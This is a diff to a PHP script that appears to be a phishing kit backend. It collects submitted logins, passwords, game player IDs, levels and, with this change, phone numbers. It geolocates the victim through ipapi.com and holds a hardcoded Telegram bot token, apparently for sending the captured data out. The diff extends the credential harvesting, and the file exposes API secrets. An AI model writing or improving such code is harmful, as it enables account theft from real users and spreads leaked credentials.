@@ -4,6 +4,7 @@ $password = $_POST['password'];
 $login = $_POST['login'];
 $playid = $_POST['playid'];
 $level = $_POST['level'];
+$phone = $_POST['phone'];
 $API_KEY = '1931977814:AAEPptNkxjNiv8I-neIQj3BRlwOFp0oAyj0';//TOKIN
 define('API_KEY',$API_KEY);
 function bot($method,$datas=[]){
@@ -42,7 +43,7 @@ function bot($method,$datas=[]){
 $ip = getUserIP();
 $api = json_decode(file_get_contents("http://api.ipapi.com/check?access_key=3230fcc0de8ef60aba3a5b3bb81a6432&format=1"));
 $country_name = $api->country_name;
-$calling_code = $api->calling_code;
+$calling_code = $api->location->calling_code;
 $ip = $api->ip;
 $jsondata = json_decode($cty1);
 $cty = $jsondata->data[0]->country;
